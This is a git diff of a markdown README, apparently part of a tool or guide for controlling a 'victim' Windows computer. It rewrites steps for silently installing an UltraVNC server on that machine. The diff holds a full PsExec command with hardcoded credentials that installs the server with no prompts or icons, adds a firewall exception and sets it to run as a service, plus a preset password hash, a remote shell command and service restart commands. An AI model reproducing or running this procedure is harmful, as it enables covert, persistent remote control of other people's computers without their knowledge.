@@ -24,23 +24,25 @@ You can run commands on the victim computer by taking advantage of the RPC featu
 
 ![Remote shell](remote-shell.png "Remote shell")
 
-## Install VNC Server to Victim
+# Install VNC Server to Victim
 
-### Step 1: Download latest ultravnc setup to host and rename to uvncsetup.exe
-### Step 2: Copy unvcsetup.exe to victim computer with path \\victim\c$\uvncsetup.exe
-### Step 3: To start silent installation on victim run uvncsetup.exe as remotely below:
+You can remotely view or control the victim computer using the UltraVNC tool. For this, follow the steps below.
+
+## Step 1: Download UltraVNC setup
+
+Download the current version of ultravnc from the website and rename it to uvncsetup.exe.
+
+## Step 2: Copy setup to victim 
+
+Copy the unvcsetup.exe file to the victim's computer's system disk. You can use this path: \\victim\c$\uvncsetup.exe
+
+## Step 3: Start installation 
+
+To start silent installation on victim computer run uvncsetup.exe as remotely using PsExec.exe below:
 
 > psexec \\victim -u admin -p admin0 -h -i -c C:\uvncsetup.exe /SP- /VERYSILENT /SUPPRESSMSGBOXES /NOCANCEL /NORESTART /CLOSEAPPLICATIONS /FORCECLOSEAPPLICATIONS /LOGCLOSEAPPLICATIONS /RESTARTAPPLICATIONS /NOICONS /FIREWALL /NOVIEW /COMPONENTS="ultravnc_server" /TASKS="installservice,startservice" /DIR="%programfiles%\uvnc"
 
-### Step 4: To define new password for UltraVNC server open a remote shell to victim computer below:
-
-psexec \\192.168.0.29 -u admin -p admin0 -h -i cmd.exe
-
-### Step 5: stop the uvnc_service service to set the password using the remote shell you opened in the previous step 
-
-> net stop uvnc_service
-
-### Step 6: Create ultravnc.ini 
+## Step 4: Define new password 
 
 Create the ultravnc.ini file with the password defined in the "%programfiles%\uvnc" of the victim computer. 
 UltraVNC password is "admin0" defined in ultravnc.ini. The ini file content is below:
@@ -49,12 +51,21 @@ UltraVNC password is "admin0" defined in ultravnc.ini. The ini file content is b
 passwd=56B6ACA18D1BA76008
 passwd2=56B6ACA18D1BA76008
 
-### Step 7: Start the service
+Copy the file to "%programfiles%\uvnc" folder on victim computer.
 
+## Step 5: Restart the service
+
+restart the service for the password to take effect. To restart the service open an interactive remote shell to victim computer below:
+
+> psexec \\victim -u admin -p admin0 -h -i cmd.exe
+
+And run below commands over remote shell:
+
+> net stop uvnc_service
 > net start uvnc_service
 
 
-## Some usefull commands
+# Some usefull shell commands
 
 Some functional command examples listed below. 
 > fsutil fsinfo drives : Get fixed disk drives list.
